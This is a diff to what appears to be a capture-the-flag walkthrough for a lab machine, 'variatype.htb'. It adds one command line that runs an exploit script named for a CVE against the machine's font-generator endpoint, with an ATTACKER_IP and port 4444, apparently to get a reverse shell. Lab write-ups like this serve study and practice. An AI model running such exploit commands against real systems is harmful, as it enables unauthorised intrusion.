@@ -1346,7 +1346,7 @@ if __name__ == "__main__":
 
 ### 3.2 Executing `varlib_cve_2025_66034.py`
 
-
+**Command:** `python3 varlib_cve_2025_66034.py --ip ATTACKER_IP --port 4444 --url http://variatype.htb/tools/variable-font-generator/process --path /var/www/variatype.htb --trigger http://variatype.htb`
 <div align="center">
 <br>
 <br>
